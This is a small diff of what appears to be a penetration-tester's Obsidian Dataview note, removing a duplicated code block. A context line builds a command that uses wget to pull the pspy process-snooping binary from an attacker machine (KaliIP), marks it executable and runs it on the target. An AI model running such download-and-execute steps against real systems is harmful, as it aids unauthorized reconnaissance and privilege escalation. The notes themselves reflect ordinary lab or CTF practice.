@@ -16,9 +16,6 @@ const command = `wget http://${KaliIP}:80/pspy64 -O pspy && chmod +x pspy && tim
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
-```
-&& chmod +x pspy && timeout 60s ./pspy
-```
 
 ---
 
